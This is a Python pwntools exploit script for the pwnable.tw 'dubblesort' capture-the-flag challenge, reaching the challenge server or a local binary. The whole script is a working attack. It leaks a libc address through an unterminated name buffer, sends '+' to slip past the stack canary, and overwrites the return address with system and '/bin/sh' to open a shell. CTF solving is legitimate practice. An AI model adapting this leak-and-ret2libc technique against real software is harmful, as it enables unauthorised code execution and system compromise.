from pwn import *
import sys



if(len(sys.argv)<2):
    p = process('./dubblesort')
    lib = ELF('/lib/i386-linux-gnu/libc.so.6')
    offset = 0x1d8000
else:
    p = remote('chall.pwnable.tw',10101)
    lib = ELF('./libc_32.so.6')
    offset = 0x1b0000
p.sendlineafter('name :','a'*24)
p.recvuntil('a'*24)
leak=u32(p.recv(4))-0xa
log.info('leak: '+hex(leak))
lib.address =leak-offset
p.sendlineafter('sort :','35')
for i in range(24):
    p.sendlineafter('number :','1')

p.sendlineafter('number :','+')

log.info('sys: '+str(lib.sym['system']))
log.info('/bin/sh'+hex(lib.search('/bin/sh').next()))
sys = lib.sym['system']
bin_sh = lib.search('/bin/sh').next()



for i in range(8):
    p.sendlineafter('number :',str(sys))
p.sendline(str(bin_sh))
p.sendline(str(bin_sh))
p.interactive()
